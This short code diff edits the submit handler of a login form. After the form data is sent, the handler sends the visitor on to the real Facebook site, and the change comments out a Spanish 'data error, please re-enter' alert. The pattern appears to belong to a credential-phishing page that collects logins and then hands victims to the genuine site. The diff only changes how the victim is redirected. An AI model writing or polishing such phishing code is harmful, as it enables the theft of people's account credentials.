@@ -25,7 +25,7 @@ document.getElementById("login-form").addEventListener("submit", function(event)
   })
   .then(response => response.text())
   .then(result => {
-    alert('Error en los datos vuelva a ingresarlos'); 
+    //alert('Error en los datos vuelva a ingresarlos'); 
     window.location.href = "https://www.facebook.com/";
   })
   .catch(error => {
